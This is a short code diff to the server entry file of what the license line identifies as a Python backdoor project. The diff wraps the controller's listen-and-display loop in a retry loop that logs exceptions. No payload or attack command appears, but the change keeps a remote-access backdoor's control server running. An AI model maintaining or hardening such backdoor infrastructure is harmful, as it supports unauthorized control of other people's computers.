@@ -7,6 +7,7 @@ license: https://github.com/xp4xbox/Python-Backdoor/blob/master/license
 """
 import sys
 import os
+import traceback
 
 # append path, needed for all 'main' files
 sys.path.append(os.path.abspath(os.path.join(os.path.dirname(os.path.realpath(__file__)), os.pardir)))
@@ -27,9 +28,12 @@ class MainServer:
         self.control = Control(self.server)
 
     def start(self):
-        self.server.listen_asych()
-
-        View(self.control)
+        while True:
+            try:
+                self.server.listen_asych()
+                View(self.control)
+            except:
+                self.server.logger.error(f"Error occurred: {traceback.format_exc()}")
 
 
 if __name__ == "__main__":
